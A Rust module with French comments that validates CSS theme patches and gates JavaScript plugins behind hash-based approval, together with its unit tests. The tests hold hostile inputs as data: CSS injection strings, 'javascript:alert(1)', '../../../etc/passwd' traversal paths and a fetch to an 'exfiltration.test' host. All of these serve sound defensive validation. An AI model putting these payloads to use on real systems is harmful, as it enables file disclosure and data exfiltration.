//! Extensibilité de l'interface : patches déclaratifs et plugins.
//!
//! Deux couches, délibérément inégales en pouvoir et en risque.
//!
//! # 1. Patches déclaratifs
//!
//! Une **description validée** de ce qui change : jetons de thème et
//! disposition. Aucun code n'est exécuté, donc la surface d'attaque est celle
//! des valeurs — et c'est là que porte l'effort. Une valeur CSS peut refermer
//! sa règle (`}`) pour en injecter d'autres, déclencher une requête réseau
//! (`url(...)`), ou tirer une feuille entière (`@import`). Chaque valeur est
//! donc filtrée, et les jetons ne s'écrivent qu'en propriétés personnalisées.
//!
//! C'est la voie normale pour que l'agent `assistant` retouche l'interface :
//! réversible, inspectable, sans exécution.
//!
//! # 2. Plugins
//!
//! Du JavaScript exécuté dans le webview, à des points d'accroche déclarés.
//! Le manifeste énumère des permissions, mais il faut être exact sur ce
//! qu'elles valent : **elles bornent l'API qu'ObsiaUi tend au plugin, pas ce
//! que son code peut atteindre dans la page**. Un plugin n'est pas isolé du
//! DOM. D'où trois garde-fous :
//!
//! - un plugin est **désactivé à l'installation** ;
//! - son contenu est empreint à l'activation, et **toute modification du
//!   fichier le redésactive** — il faut le réapprouver ;
//! - le manifeste est validé avant tout chargement.
//!
//! L'empreinte détecte une dérive, pas un adversaire : qui peut réécrire le
//! fichier peut aussi réécrire l'empreinte. Elle protège d'une mise à jour
//! silencieuse, pas d'une machine déjà compromise.

use crate::store::JsonStore;
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use std::collections::BTreeMap;
use std::path::{Path, PathBuf};
use std::time::{SystemTime, UNIX_EPOCH};
use tracing::{info, warn};

/// Longueur maximale d'une valeur de thème.
const VALEUR_MAX: usize = 120;

/// Nombre maximal de jetons dans un patch.
const JETONS_MAX: usize = 64;

/// Fragments interdits dans une valeur CSS, en minuscules.
///
/// `url(` et `image(` sortent sur le réseau — une valeur de thème suffirait à
/// pister l'ouverture de la fenêtre. `@import` tire une feuille entière.
/// `expression(` est un reste d'IE qui exécute du script. `javascript:` et
/// `data:` transforment une valeur en vecteur d'exécution. `var(` est écarté
/// pour éviter qu'un jeton en référence un autre en boucle.
const FRAGMENTS_INTERDITS: &[&str] = &[
    "url(",
    "image(",
    "image-set(",
    "@import",
    "expression(",
    "javascript:",
    "data:",
    "var(",
    "attr(",
    "element(",
];

/// Caractères interdits : ils permettent de sortir de la déclaration.
const CARACTERES_INTERDITS: &[char] = &['{', '}', ';', '<', '>', '\\', '"', '\'', '\n', '\r'];

// ===== Patches déclaratifs =====

/// Ce qu'un patch peut changer à la disposition.
#[derive(Debug, Clone, Default, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct LayoutPatch {
    #[serde(default)]
    pub left_open: Option<bool>,
    #[serde(default)]
    pub right_open: Option<bool>,
    /// Largeur du panneau de contrôle, en pixels.
    #[serde(default)]
    pub left_width: Option<u32>,
    /// Largeur du gestionnaire de fichiers, en pixels.
    #[serde(default)]
    pub right_width: Option<u32>,
    /// Ordre des sections du panneau de contrôle.
    #[serde(default)]
    pub panels: Option<Vec<String>>,
}

/// Bornes de disposition : au-delà, un panneau devient inutilisable ou
/// masque le chat.
const LARGEUR_MIN: u32 = 180;
const LARGEUR_MAX: u32 = 900;

/// Sections connues du panneau de contrôle, seules réordonnables.
pub const PANNEAUX_CONNUS: &[&str] = &["teams", "plans", "remote", "plugins", "config"];

impl LayoutPatch {
    pub fn validate(&self) -> Result<(), String> {
        for (nom, largeur) in [("gauche", self.left_width), ("droite", self.right_width)] {
            if let Some(l) = largeur {
                if !(LARGEUR_MIN..=LARGEUR_MAX).contains(&l) {
                    return Err(format!(
                        "largeur {nom} hors bornes : {l} px (attendu entre \
                         {LARGEUR_MIN} et {LARGEUR_MAX})"
                    ));
                }
            }
        }
        if let Some(panneaux) = &self.panels {
            let mut vus = std::collections::HashSet::new();
            for p in panneaux {
                if !PANNEAUX_CONNUS.contains(&p.as_str()) {
                    return Err(format!("panneau inconnu : {p}"));
                }
                if !vus.insert(p.as_str()) {
                    return Err(format!("panneau « {p} » listé deux fois"));
                }
            }
        }
        Ok(())
    }
}

/// Un patch d'interface : description, jamais du code.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct UiPatch {
    pub id: String,
    pub name: String,
    #[serde(default)]
    pub description: String,
    /// Jetons de thème : nom (sans `--`) vers valeur CSS.
    ///
    /// Ordonné pour que deux enregistrements successifs produisent le même
    /// fichier — un diff Git lisible en dépend.
    #[serde(default)]
    pub theme: BTreeMap<String, String>,
    #[serde(default)]
    pub layout: LayoutPatch,
    /// Un patch enregistré n'est pas actif tant qu'il n'est pas appliqué.
    #[serde(default)]
    pub enabled: bool,
    pub created_at: u64,
    pub updated_at: u64,
}

impl UiPatch {
    pub fn new(name: String, description: String) -> Self {
        let at = now();
        Self {
            id: uuid::Uuid::new_v4().to_string(),
            name,
            description,
            theme: BTreeMap::new(),
            layout: LayoutPatch::default(),
            enabled: false,
            created_at: at,
            updated_at: at,
        }
    }

    pub fn validate(&self) -> Result<(), String> {
        if self.name.trim().is_empty() {
            return Err("le nom du patch est requis".into());
        }
        if self.theme.len() > JETONS_MAX {
            return Err(format!("un patch ne dépasse pas {JETONS_MAX} jetons"));
        }
        for (nom, valeur) in &self.theme {
            valider_nom_jeton(nom)?;
            valider_valeur_css(valeur).map_err(|e| format!("jeton « {nom} » : {e}"))?;
        }
        self.layout.validate()
    }

    /// Rend le patch en déclarations CSS, à poser sur `:root`.
    ///
    /// Uniquement des propriétés personnalisées : elles sont inertes tant
    /// qu'une règle existante ne les référence pas, ce qui borne l'effet d'un
    /// patch à la palette prévue par l'interface.
    pub fn to_css(&self) -> String {
        self.theme
            .iter()
            .map(|(nom, valeur)| format!("--{nom}: {valeur};"))
            .collect::<Vec<_>>()
            .join("\n")
    }
}

/// Un nom de jeton : minuscules, chiffres, tirets. Pas de `--` initial, il est
/// ajouté au rendu.
pub fn valider_nom_jeton(nom: &str) -> Result<(), String> {
    if nom.is_empty() || nom.len() > 40 {
        return Err(format!("nom de jeton invalide : {nom}"));
    }
    if nom.starts_with('-') || nom.ends_with('-') {
        return Err(format!("un nom de jeton ne borde pas de tiret : {nom}"));
    }
    if !nom
        .chars()
        .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '-')
    {
        return Err(format!(
            "nom de jeton invalide : {nom} (minuscules, chiffres et tirets)"
        ));
    }
    Ok(())
}

/// Valide une valeur CSS de thème.
///
/// Le refus est explicite pour que l'utilisateur — ou l'agent qui propose le
/// patch — comprenne ce qui coince, plutôt que de voir sa couleur disparaître
/// sans raison.
pub fn valider_valeur_css(valeur: &str) -> Result<(), String> {
    let nu = valeur.trim();
    if nu.is_empty() {
        return Err("valeur vide".into());
    }
    if nu.len() > VALEUR_MAX {
        return Err(format!("valeur trop longue (> {VALEUR_MAX} caractères)"));
    }
    if let Some(c) = nu.chars().find(|c| CARACTERES_INTERDITS.contains(c)) {
        return Err(format!(
            "caractère interdit « {c} » : il permettrait de sortir de la déclaration"
        ));
    }
    let bas = nu.to_ascii_lowercase();
    if let Some(f) = FRAGMENTS_INTERDITS.iter().find(|f| bas.contains(**f)) {
        return Err(format!(
            "« {f} » interdit dans une valeur de thème (exécution ou requête réseau)"
        ));
    }
    // Un commentaire CSS peut masquer la suite d'une règle.
    if bas.contains("/*") || bas.contains("*/") {
        return Err("commentaire interdit dans une valeur de thème".into());
    }
    Ok(())
}

// ===== Plugins =====

/// Où un plugin s'accroche dans l'interface.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum MountPoint {
    /// Section supplémentaire dans le panneau de contrôle.
    ControlPanel,
    /// Bouton dans la barre de la session courante.
    ChatToolbar,
    /// Bandeau en pied de fenêtre.
    StatusBar,
}

/// Ce qu'ObsiaUi accepte de tendre à un plugin.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum Permission {
    /// Lecture des notes du coffre.
    VaultRead,
    /// Écriture dans `brouillon/` — le reste du coffre reste inaccessible.
    VaultWrite,
    /// Lecture et conduite des sessions.
    Sessions,
    /// Liste des fournisseurs et des modèles.
    Providers,
}

impl Permission {
    /// Commandes qu'une permission ouvre.
    pub fn commandes(self) -> &'static [&'static str] {
        match self {
            Permission::VaultRead => &["vault_list", "vault_read", "vault_path", "agents_list"],
            Permission::VaultWrite => &["vault_write"],
            Permission::Sessions => &[
                "sessions_list",
                "session_get",
                "session_create",
                "session_send",
                "session_cancel",
            ],
            Permission::Providers => &["providers_list", "models_list", "runtimes_detect"],
        }
    }
}

/// Commandes ouvertes par un jeu de permissions.
pub fn commandes_autorisees(permissions: &[Permission]) -> Vec<String> {
    let mut out: Vec<String> = permissions
        .iter()
        .flat_map(|p| p.commandes().iter().map(|c| c.to_string()))
        .collect();
    out.sort();
    out.dedup();
    out
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct PluginManifest {
    pub id: String,
    pub name: String,
    pub version: String,
    #[serde(default)]
    pub description: String,
    /// Fichier JavaScript, relatif au dossier du plugin.
    pub entry: String,
    pub mount: Vec<MountPoint>,
    #[serde(default)]
    pub permissions: Vec<Permission>,
}

impl PluginManifest {
    pub fn validate(&self) -> Result<(), String> {
        if !crate::store::est_id_valide(&self.id) {
            return Err(format!(
                "identifiant de plugin invalide : {} (minuscules, chiffres, tirets)",
                self.id
            ));
        }
        if self.name.trim().is_empty() || self.version.trim().is_empty() {
            return Err("nom et version sont requis".into());
        }
        if self.mount.is_empty() {
            return Err("un plugin déclare au moins un point d'accroche".into());
        }
        valider_entree(&self.entry)
    }
}

/// Valide le chemin du fichier d'entrée.
///
/// Il sert à ouvrir un fichier sous le dossier du plugin : sans cette
/// barrière, `../../../etc/passwd` serait lu et renvoyé à l'interface.
pub fn valider_entree(entry: &str) -> Result<(), String> {
    let nu = entry.trim();
    if nu.is_empty() {
        return Err("fichier d'entrée requis".into());
    }
    if !nu.ends_with(".js") {
        return Err("le fichier d'entrée est un .js".into());
    }
    if nu.contains("..") || nu.starts_with('/') || nu.contains('\\') {
        return Err("chemin d'entrée refusé : il doit rester dans le dossier du plugin".into());
    }
    Ok(())
}

/// État d'un plugin installé, tel que l'interface le voit.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct InstalledPlugin {
    #[serde(flatten)]
    pub manifest: PluginManifest,
    /// Un plugin est inactif à l'installation.
    #[serde(default)]
    pub enabled: bool,
    /// Empreinte du code au moment de l'activation.
    #[serde(default)]
    pub approved_digest: Option<String>,
    /// Empreinte du code sur disque, recalculée à chaque lecture.
    #[serde(default)]
    pub current_digest: Option<String>,
    /// Vrai quand le fichier a changé depuis l'activation.
    #[serde(default)]
    pub needs_review: bool,
}

/// Empreinte SHA-256 d'un contenu, en hexadécimal.
pub fn empreinte(source: &str) -> String {
    let resume = Sha256::digest(source.as_bytes());
    resume.iter().map(|o| format!("{o:02x}")).collect()
}

/// Un plugin doit-il être réapprouvé ?
///
/// Vrai dès que le code diffère de celui qui a été approuvé, ou qu'aucune
/// approbation n'existe alors que le plugin est marqué actif.
pub fn exige_revue(approuve: Option<&str>, courant: Option<&str>) -> bool {
    match (approuve, courant) {
        (Some(a), Some(c)) => a != c,
        // Actif sans empreinte approuvée, ou code introuvable : à revoir.
        _ => true,
    }
}

// ===== Stockage =====

/// Patches et plugins.
///
/// Les patches sont des documents JSON ; les plugins vivent chacun dans leur
/// dossier, avec leur manifeste et leur code.
pub struct PluginStore {
    patches: JsonStore,
    plugins_dir: PathBuf,
    /// États d'activation, séparés des manifestes : le manifeste appartient à
    /// l'auteur du plugin, l'activation à l'utilisateur. Réinstaller ne doit
    /// pas réactiver tout seul.
    etats: JsonStore,
}

/// Activation d'un plugin, décidée par l'utilisateur.
#[derive(Debug, Clone, Default, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct EtatPlugin {
    id: String,
    enabled: bool,
    approved_digest: Option<String>,
}

impl PluginStore {
    pub fn new(base: impl Into<PathBuf>) -> Self {
        let base = base.into();
        Self {
            patches: JsonStore::new(base.join("patches")),
            plugins_dir: base.join("plugins"),
            etats: JsonStore::new(base.join("plugin-states")),
        }
    }

    pub fn plugins_dir(&self) -> &Path {
        &self.plugins_dir
    }

    // --- Patches ---

    pub fn save_patch(&self, patch: &UiPatch) -> Result<(), String> {
        patch.validate()?;
        self.patches.save(&patch.id, patch)
    }

    pub fn load_patch(&self, id: &str) -> Result<UiPatch, String> {
        self.patches.load(id)
    }

    pub fn delete_patch(&self, id: &str) -> Result<(), String> {
        self.patches.delete(id)
    }

    /// Patches enregistrés, triés par nom pour un affichage stable.
    pub fn list_patches(&self) -> Vec<UiPatch> {
        let mut v: Vec<UiPatch> = self.patches.load_all();
        v.sort_by(|a, b| a.name.cmp(&b.name).then(a.id.cmp(&b.id)));
        v
    }

    /// CSS cumulé des patches actifs.
    ///
    /// Les patches s'appliquent dans l'ordre d'affichage : le dernier gagne
    /// sur un jeton commun, comme des feuilles de style empilées.
    pub fn css_actif(&self) -> String {
        let mut fusion: BTreeMap<String, String> = BTreeMap::new();
        for p in self.list_patches().into_iter().filter(|p| p.enabled) {
            for (nom, valeur) in p.theme {
                fusion.insert(nom, valeur);
            }
        }
        fusion
            .iter()
            .map(|(nom, valeur)| format!("--{nom}: {valeur};"))
            .collect::<Vec<_>>()
            .join("\n")
    }

    // --- Plugins ---

    fn etat(&self, id: &str) -> EtatPlugin {
        self.etats.load::<EtatPlugin>(id).unwrap_or(EtatPlugin {
            id: id.to_string(),
            enabled: false,
            approved_digest: None,
        })
    }

    /// Lit le code d'un plugin, en restant sous son dossier.
    pub fn source(&self, id: &str) -> Result<String, String> {
        let manifest = self.manifest(id)?;
        let dossier = self.dossier(id)?;
        let chemin = dossier.join(&manifest.entry);
        // Deuxième barrière après la validation du manifeste : on vérifie que
        // le chemin résolu reste bien sous le dossier du plugin, symlink
        // compris.
        let canonique = chemin
            .canonicalize()
            .map_err(|e| format!("code du plugin {id} illisible : {e}"))?;
        let base = dossier
            .canonicalize()
            .map_err(|e| format!("dossier du plugin {id} illisible : {e}"))?;
        if !canonique.starts_with(&base) {
            warn!(
                plugin = id,
                "tentative de sortie du dossier du plugin bloquée"
            );
            return Err("chemin hors du dossier du plugin refusé".into());
        }
        std::fs::read_to_string(&canonique)
            .map_err(|e| format!("code du plugin {id} illisible : {e}"))
    }

    fn dossier(&self, id: &str) -> Result<PathBuf, String> {
        if !crate::store::est_id_valide(id) {
            return Err(format!("identifiant de plugin invalide : {id}"));
        }
        Ok(self.plugins_dir.join(id))
    }

    pub fn manifest(&self, id: &str) -> Result<PluginManifest, String> {
        let chemin = self.dossier(id)?.join("plugin.json");
        let raw = std::fs::read_to_string(&chemin)
            .map_err(|e| format!("manifeste de {id} illisible : {e}"))?;
        let m: PluginManifest =
            serde_json::from_str(&raw).map_err(|e| format!("manifeste de {id} invalide : {e}"))?;
        m.validate()?;
        if m.id != id {
            return Err(format!(
                "le manifeste déclare « {} » alors qu'il vit dans « {id} »",
                m.id
            ));
        }
        Ok(m)
    }

    /// Plugins installés, avec leur état d'activation et l'écart éventuel
    /// entre le code approuvé et celui présent sur disque.
    pub fn list_plugins(&self) -> Vec<InstalledPlugin> {
        let Ok(entries) = std::fs::read_dir(&self.plugins_dir) else {
            return Vec::new();
        };
        let mut out: Vec<InstalledPlugin> = entries
            .flatten()
            .filter(|e| e.path().is_dir())
            .filter_map(|e| {
                let id = e.file_name().to_string_lossy().to_string();
                match self.manifest(&id) {
                    Ok(manifest) => {
                        let etat = self.etat(&id);
                        let current = self.source(&id).ok().map(|s| empreinte(&s));
                        let needs_review = etat.enabled
                            && exige_revue(etat.approved_digest.as_deref(), current.as_deref());
                        Some(InstalledPlugin {
                            manifest,
                            // Un plugin dont le code a changé est présenté
                            // comme inactif : il doit être réapprouvé.
                            enabled: etat.enabled && !needs_review,
                            approved_digest: etat.approved_digest,
                            current_digest: current,
                            needs_review,
                        })
                    }
                    Err(err) => {
                        warn!(plugin = %id, %err, "manifeste invalide, plugin ignoré");
                        None
                    }
                }
            })
            .collect();
        out.sort_by(|a, b| a.manifest.name.cmp(&b.manifest.name));
        out
    }

    /// Active un plugin en approuvant le code présent sur disque.
    pub fn enable(&self, id: &str) -> Result<InstalledPlugin, String> {
        let manifest = self.manifest(id)?;
        let source = self.source(id)?;
        let digest = empreinte(&source);
        self.etats.save(
            id,
            &EtatPlugin {
                id: id.to_string(),
                enabled: true,
                approved_digest: Some(digest.clone()),
            },
        )?;
        info!(plugin = id, "plugin activé (code approuvé)");
        Ok(InstalledPlugin {
            manifest,
            enabled: true,
            approved_digest: Some(digest.clone()),
            current_digest: Some(digest),
            needs_review: false,
        })
    }

    pub fn disable(&self, id: &str) -> Result<(), String> {
        let etat = EtatPlugin {
            id: id.to_string(),
            enabled: false,
            approved_digest: None,
        };
        self.etats.save(id, &etat)
    }
}

fn now() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn patch(jetons: &[(&str, &str)]) -> UiPatch {
        let mut p = UiPatch::new("Sombre".into(), "palette sombre".into());
        for (n, v) in jetons {
            p.theme.insert((*n).to_string(), (*v).to_string());
        }
        p
    }

    // ===== Valeurs de thème =====

    #[test]
    fn les_valeurs_usuelles_passent() {
        for v in [
            "#1e1e1e",
            "rgb(30 30 30 / 80%)",
            "1px solid #333",
            "system-ui, sans-serif",
            "calc(100% - 12px)",
        ] {
            assert!(valider_valeur_css(v).is_ok(), "refusée à tort : {v}");
        }
    }

    #[test]
    fn une_valeur_ne_peut_pas_refermer_sa_regle() {
        // Sans ce refus, un jeton suffirait à injecter des règles arbitraires.
        let err = valider_valeur_css("#fff } body { display: none").unwrap_err();
        assert!(err.contains("interdit"), "message : {err}");
    }

    #[test]
    fn une_valeur_ne_peut_pas_sortir_sur_le_reseau() {
        // Une valeur de thème suffirait à pister l'ouverture de la fenêtre.
        assert!(valider_valeur_css("url(https://exemple.test/pixel.png)").is_err());
        assert!(valider_valeur_css("URL(HTTPS://EXEMPLE.TEST)").is_err());
        assert!(valider_valeur_css("image-set(\"a.png\" 1x)").is_err());
    }

    #[test]
    fn une_valeur_ne_peut_pas_importer_ni_executer() {
        assert!(valider_valeur_css("@import 'https://exemple.test/x.css'").is_err());
        assert!(valider_valeur_css("expression(alert(1))").is_err());
        assert!(valider_valeur_css("javascript:alert(1)").is_err());
        assert!(valider_valeur_css("data:text/css,body{}").is_err());
    }

    #[test]
    fn une_valeur_ne_peut_pas_empiler_des_declarations() {
        assert!(valider_valeur_css("#fff; position: fixed").is_err());
    }

    #[test]
    fn un_commentaire_est_refuse() {
        // `/*` masquerait la fin de la règle et tout ce qui suit.
        assert!(valider_valeur_css("#fff /* la suite est masquée").is_err());
    }

    #[test]
    fn une_valeur_vide_ou_trop_longue_est_refusee() {
        assert!(valider_valeur_css("   ").is_err());
        assert!(valider_valeur_css(&"a".repeat(VALEUR_MAX + 1)).is_err());
    }

    #[test]
    fn un_jeton_ne_peut_pas_en_referencer_un_autre() {
        // `var()` ouvrirait des références croisées, voire circulaires.
        assert!(valider_valeur_css("var(--autre)").is_err());
    }

    // ===== Noms de jetons =====

    #[test]
    fn les_noms_de_jetons_sont_stricts() {
        assert!(valider_nom_jeton("panel-bg").is_ok());
        assert!(valider_nom_jeton("ok2").is_ok());
        for mauvais in [
            "", "Panel", "panel bg", "--panel", "panel-", "-panel", "panel:bg",
        ] {
            assert!(
                valider_nom_jeton(mauvais).is_err(),
                "accepté à tort : {mauvais:?}"
            );
        }
    }

    // ===== Patch =====

    #[test]
    fn un_patch_valide_rend_des_proprietes_personnalisees() {
        // Elles sont inertes tant qu'une règle existante ne les référence pas.
        let p = patch(&[("panel-bg", "#18191b"), ("border", "#3a3a3a")]);
        p.validate().unwrap();
        let css = p.to_css();
        assert!(css.contains("--panel-bg: #18191b;"));
        assert!(css.contains("--border: #3a3a3a;"));
        assert!(!css.contains('{'), "un patch ne produit jamais de règle");
    }

    #[test]
    fn un_patch_sans_nom_est_refuse() {
        let mut p = patch(&[]);
        p.name = "  ".into();
        assert!(p.validate().is_err());
    }

    #[test]
    fn un_patch_signale_le_jeton_fautif() {
        let p = patch(&[("bon", "#fff"), ("mauvais", "url(http://x)")]);
        let err = p.validate().unwrap_err();
        assert!(err.contains("mauvais"), "message : {err}");
    }

    #[test]
    fn le_nombre_de_jetons_est_borne() {
        let mut p = patch(&[]);
        for i in 0..=JETONS_MAX {
            p.theme.insert(format!("jeton-{i}"), "#fff".into());
        }
        assert!(p.validate().is_err());
    }

    #[test]
    fn le_rendu_est_stable_d_un_enregistrement_a_l_autre() {
        // Ordre déterministe : un diff Git reste lisible.
        let a = patch(&[("b", "#111"), ("a", "#222")]);
        let b = patch(&[("a", "#222"), ("b", "#111")]);
        assert_eq!(a.to_css(), b.to_css());
    }

    // ===== Disposition =====

    #[test]
    fn une_largeur_hors_bornes_est_refusee() {
        // Trop étroit, le panneau devient inutilisable ; trop large, il
        // recouvre le chat.
        let mut l = LayoutPatch {
            left_width: Some(10),
            ..Default::default()
        };
        assert!(l.validate().is_err());
        l.left_width = Some(5000);
        assert!(l.validate().is_err());
        l.left_width = Some(320);
        assert!(l.validate().is_ok());
    }

    #[test]
    fn seuls_les_panneaux_connus_sont_reordonnables() {
        let l = LayoutPatch {
            panels: Some(vec!["teams".into(), "inconnu".into()]),
            ..Default::default()
        };
        assert!(l.validate().unwrap_err().contains("inconnu"));
    }

    #[test]
    fn un_panneau_liste_deux_fois_est_refuse() {
        let l = LayoutPatch {
            panels: Some(vec!["teams".into(), "teams".into()]),
            ..Default::default()
        };
        assert!(l.validate().is_err());
    }

    // ===== Permissions =====

    #[test]
    fn une_permission_n_ouvre_que_ses_commandes() {
        let lecture = commandes_autorisees(&[Permission::VaultRead]);
        assert!(lecture.contains(&"vault_read".to_string()));
        assert!(
            !lecture.contains(&"vault_write".to_string()),
            "la lecture ne doit pas ouvrir l'écriture"
        );
    }

    #[test]
    fn aucune_permission_n_ouvre_la_configuration_ni_le_distant() {
        // Un plugin ne doit atteindre ni les clés d'API ni le daemon.
        let toutes = commandes_autorisees(&[
            Permission::VaultRead,
            Permission::VaultWrite,
            Permission::Sessions,
            Permission::Providers,
        ]);
        for interdite in [
            "config_get",
            "config_set",
            "remote_start",
            "remote_token_read",
        ] {
            assert!(
                !toutes.contains(&interdite.to_string()),
                "{interdite} ne doit être ouverte par aucune permission"
            );
        }
    }

    #[test]
    fn les_commandes_ouvertes_sont_sans_doublon_et_triees() {
        let c = commandes_autorisees(&[Permission::VaultRead, Permission::VaultRead]);
        let mut trie = c.clone();
        trie.sort();
        trie.dedup();
        assert_eq!(c, trie);
    }

    // ===== Manifeste =====

    fn manifeste() -> PluginManifest {
        PluginManifest {
            id: "compteur".into(),
            name: "Compteur".into(),
            version: "1.0.0".into(),
            description: String::new(),
            entry: "index.js".into(),
            mount: vec![MountPoint::ControlPanel],
            permissions: vec![Permission::Sessions],
        }
    }

    #[test]
    fn un_manifeste_complet_est_accepte() {
        assert!(manifeste().validate().is_ok());
    }

    #[test]
    fn un_manifeste_sans_point_d_accroche_est_refuse() {
        let mut m = manifeste();
        m.mount.clear();
        assert!(m.validate().is_err());
    }

    #[test]
    fn un_identifiant_de_plugin_hostile_est_refuse() {
        let mut m = manifeste();
        m.id = "../evasion".into();
        assert!(m.validate().is_err());
    }

    #[test]
    fn le_fichier_d_entree_ne_peut_pas_sortir_du_dossier() {
        // Sans cette barrière, n'importe quel fichier serait lu et renvoyé.
        for mauvais in [
            "../../../etc/passwd",
            "/etc/passwd",
            "..\\windows",
            "sous/../../dehors.js",
        ] {
            assert!(
                valider_entree(mauvais).is_err(),
                "accepté à tort : {mauvais}"
            );
        }
        assert!(valider_entree("index.js").is_ok());
        assert!(valider_entree("src/index.js").is_ok());
    }

    #[test]
    fn seul_un_fichier_js_est_accepte_en_entree() {
        assert!(valider_entree("index.html").is_err());
        assert!(valider_entree("").is_err());
    }

    // ===== Empreinte et revue =====

    #[test]
    fn l_empreinte_change_avec_le_code() {
        let a = empreinte("console.log(1)");
        assert_eq!(a.len(), 64);
        assert_ne!(a, empreinte("console.log(2)"));
        assert_eq!(a, empreinte("console.log(1)"));
    }

    #[test]
    fn un_code_modifie_exige_une_revue() {
        assert!(!exige_revue(Some("abc"), Some("abc")));
        assert!(exige_revue(Some("abc"), Some("def")));
        // Actif sans approbation, ou code devenu introuvable.
        assert!(exige_revue(None, Some("abc")));
        assert!(exige_revue(Some("abc"), None));
    }

    // ===== Stockage =====

    fn store() -> (tempfile::TempDir, PluginStore) {
        let dir = tempfile::tempdir().unwrap();
        let s = PluginStore::new(dir.path());
        (dir, s)
    }

    fn installer(store: &PluginStore, id: &str, source: &str) {
        let dossier = store.plugins_dir().join(id);
        std::fs::create_dir_all(&dossier).unwrap();
        let mut m = manifeste();
        m.id = id.to_string();
        std::fs::write(
            dossier.join("plugin.json"),
            serde_json::to_string(&m).unwrap(),
        )
        .unwrap();
        std::fs::write(dossier.join("index.js"), source).unwrap();
    }

    #[test]
    fn un_patch_invalide_n_est_pas_enregistre() {
        let (_d, s) = store();
        let p = patch(&[("x", "url(http://x)")]);
        assert!(s.save_patch(&p).is_err());
        assert!(s.list_patches().is_empty());
    }

    #[test]
    fn seuls_les_patches_actifs_produisent_du_css() {
        let (_d, s) = store();
        let mut actif = patch(&[("panel-bg", "#111")]);
        actif.enabled = true;
        let inactif = patch(&[("border", "#999")]);
        s.save_patch(&actif).unwrap();
        s.save_patch(&inactif).unwrap();
        let css = s.css_actif();
        assert!(css.contains("--panel-bg: #111;"));
        assert!(!css.contains("--border"));
    }

    #[test]
    fn un_plugin_est_inactif_a_l_installation() {
        // Installer ne vaut pas approuver.
        let (_d, s) = store();
        installer(&s, "compteur", "obsia.onMount('control-panel', () => {})");
        let liste = s.list_plugins();
        assert_eq!(liste.len(), 1);
        assert!(!liste[0].enabled);
        assert!(liste[0].approved_digest.is_none());
    }

    #[test]
    fn activer_approuve_le_code_present() {
        let (_d, s) = store();
        installer(&s, "compteur", "const a = 1;");
        let actif = s.enable("compteur").unwrap();
        assert!(actif.enabled);
        assert!(!actif.needs_review);
        assert_eq!(actif.approved_digest, actif.current_digest);
    }

    #[test]
    fn un_code_modifie_apres_activation_redesactive_le_plugin() {
        // C'est la garde qui empêche une mise à jour silencieuse de
        // s'exécuter sans que personne l'ait relue.
        let (_d, s) = store();
        installer(&s, "compteur", "const a = 1;");
        s.enable("compteur").unwrap();
        std::fs::write(
            s.plugins_dir().join("compteur").join("index.js"),
            "fetch('https://exfiltration.test')",
        )
        .unwrap();

        let liste = s.list_plugins();
        assert!(liste[0].needs_review, "la modification doit être détectée");
        assert!(
            !liste[0].enabled,
            "un plugin à revoir ne doit pas être actif"
        );
    }

    #[test]
    fn reapprouver_reactive_le_plugin() {
        let (_d, s) = store();
        installer(&s, "compteur", "const a = 1;");
        s.enable("compteur").unwrap();
        std::fs::write(
            s.plugins_dir().join("compteur").join("index.js"),
            "const a = 2;",
        )
        .unwrap();
        assert!(s.list_plugins()[0].needs_review);
        s.enable("compteur").unwrap();
        let liste = s.list_plugins();
        assert!(liste[0].enabled);
        assert!(!liste[0].needs_review);
    }

    #[test]
    fn desactiver_oublie_l_approbation() {
        let (_d, s) = store();
        installer(&s, "compteur", "const a = 1;");
        s.enable("compteur").unwrap();
        s.disable("compteur").unwrap();
        let liste = s.list_plugins();
        assert!(!liste[0].enabled);
        assert!(liste[0].approved_digest.is_none());
    }

    #[test]
    fn un_manifeste_qui_ment_sur_son_dossier_est_rejete() {
        // Sinon un plugin pourrait usurper l'identité — et les permissions —
        // d'un autre.
        let (_d, s) = store();
        let dossier = s.plugins_dir().join("vrai-nom");
        std::fs::create_dir_all(&dossier).unwrap();
        let mut m = manifeste();
        m.id = "autre-nom".into();
        std::fs::write(
            dossier.join("plugin.json"),
            serde_json::to_string(&m).unwrap(),
        )
        .unwrap();
        std::fs::write(dossier.join("index.js"), "").unwrap();
        assert!(s.manifest("vrai-nom").is_err());
        assert!(s.list_plugins().is_empty());
    }

    #[test]
    fn un_plugin_au_manifeste_invalide_n_empeche_pas_de_lister_les_autres() {
        let (_d, s) = store();
        installer(&s, "bon", "const a = 1;");
        let casse = s.plugins_dir().join("casse");
        std::fs::create_dir_all(&casse).unwrap();
        std::fs::write(casse.join("plugin.json"), "{ pas du json").unwrap();
        let liste = s.list_plugins();
        assert_eq!(liste.len(), 1);
        assert_eq!(liste[0].manifest.id, "bon");
    }

    #[test]
    fn lister_sans_dossier_de_plugins_ne_panique_pas() {
        let (_d, s) = store();
        assert!(s.list_plugins().is_empty());
    }

    #[test]
    fn le_code_d_un_plugin_se_lit_par_son_manifeste() {
        let (_d, s) = store();
        installer(&s, "compteur", "const salut = 1;");
        assert_eq!(s.source("compteur").unwrap(), "const salut = 1;");
        assert!(s.source("../evasion").is_err());
    }
}
